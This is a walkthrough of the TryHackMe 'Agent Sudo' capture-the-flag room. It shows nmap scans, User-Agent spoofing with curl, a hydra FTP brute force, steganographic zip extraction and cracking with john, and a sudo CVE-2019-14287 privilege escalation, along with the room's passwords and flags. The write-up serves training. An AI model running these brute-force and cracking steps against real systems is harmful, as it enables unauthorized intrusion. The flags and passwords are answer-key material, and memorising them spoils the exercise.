# 🕵️‍♂️ Agent Sudo — TryHackMe Walkthrough

> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/aedc6b66c222e15ff740c282a0c3f44e.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/agentsudoctf">
    <img src="https://img.shields.io/badge/TryHackMe-Agent%20Sudo-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20Stego%20%7C%20PrivEsc-blue">
</p>

---

## 📚 Topics Covered

- Network Enumeration  
- Web Header Manipulation  
- Brute Forcing (FTP)  
- Brute Forcing (ZIP)  
- Steganography  
- Cryptography (Base64)  
- OSINT  
- CVE-2019-14287 (Sudo < 1.8.28)



---

# 🚀 Task 1 — Enumeration

```bash
kali@kali:~/CTFs/tryhackme/Agent Sudo$ sudo nmap -A -Pn -sC -sV -O MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:28 CEST
Nmap scan report for 10.10.34.31
Host is up (0.053s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=35221%PV=Y%DS=2%DC=T%G=Y%TM=5F79B1F
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%II=I%
OS:TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5
OS:=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   36.49 ms 10.8.0.1
2   36.67 ms 10.10.34.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.71 seconds

```

## ❓ How many open ports?

<details>
<summary>Click to reveal answer</summary>

3  
(21 FTP, 22 SSH, 80 HTTP)

</details>

---

# 🌐 Task 2 — Web Header Manipulation

Homepage hint:

> Use your own codename as user-agent to access the site.

```bash
kali@kali:~/CTFs/tryhackme/Agent Sudo$ curl -A "C" -L 10.10.34.31
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

## ❓ What is the agent name?

<details>
<summary>Click to reveal answer</summary>

chris

</details>

---

# 🔐 Task 3 — FTP Brute Force

```bash
kali@kali:~/CTFs/tryhackme/Agent Sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.34.31 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 13:36:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.34.31:21/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344243 to do in 1532:31h, 16 active
[21][ftp] host: 10.10.34.31   login: chris   password: crystal
```

## ❓ What is the FTP password?

<details>
<summary>Click to reveal answer</summary>

crystal

</details>

---

# 🗂 Task 4 — ZIP Password Cracking

```bash
kali@kali:~/CTFs/tryhackme/Agent Sudo$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

````
```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ zip2john _cutie.png.extracted/8702.zip > zip.hash
ver 81.9 _cutie.png.extracted/8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
kali@kali:~/CTFs/tryhackme/Agent Sudo$ john zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2020-10-04 13:42) 0.6993g/s 37134p/s 37134c/s 37134C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## ❓ What is the ZIP password?

<details>
<summary>Click to reveal answer</summary>

alien

</details>

---

# 🧬 Task 5 — Base64 Decoding

```bash
echo -n 'QXJlYTUx' | base64 -d
```

## ❓ What is the decoded text?

<details>
<summary>Click to reveal answer</summary>

Area51

</details>

---

# 👤 Task 6 — Identify the Other Agent

## ❓ Who is the other agent (full name)?

<details>
<summary>Click to reveal answer</summary>

james

</details>

---

# 🔑 Task 7 — SSH Access

From message.txt:

Password: hackerrules!

## ❓ What is the SSH password?

<details>
<summary>Click to reveal answer</summary>

hackerrules!

</details>

---

# 🏁 Task 8 — Capture the User Flag

```bash
cat user_flag.txt
```

## ❓ What is the user flag?

<details>
<summary>Click to reveal answer</summary>

b03d975e8c92a7c04146cfa7a5a313c7

</details>

---

# 👽 Task 9 — OSINT Investigation

Downloaded image: Alien_autospy.jpg

## ❓ What is the incident called?

<details>
<summary>Click to reveal answer</summary>

roswell alien autopsy

</details>

---

# 🚀 Task 10 — Privilege Escalation

Sudo version vulnerable to:

## ❓ What is the CVE number?

<details>
<summary>Click to reveal answer</summary>

CVE-2019-14287

</details>

---

## ❓ What is the root flag?

<details>
<summary>Click to reveal answer</summary>

b53a02f55b57d4439e3341834d70c062

</details>

---

# 🎯 Bonus

## ❓ Who is Agent R?

<details>
<summary>Click to reveal answer</summary>

DesKel

</details>

---

# ✅ Summary Table

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap | 3 open ports |
| Web | User-Agent manipulation | Found chris |
| FTP | Hydra brute force | crystal |
| Stego | Binwalk + John | alien |
| Crypto | Base64 decode | Area51 |
| SSH | Credential reuse | hackerrules! |
| PrivEsc | CVE-2019-14287 | Root access |

---

⚠️ Educational use only. Practice on authorized platforms like TryHackMe.
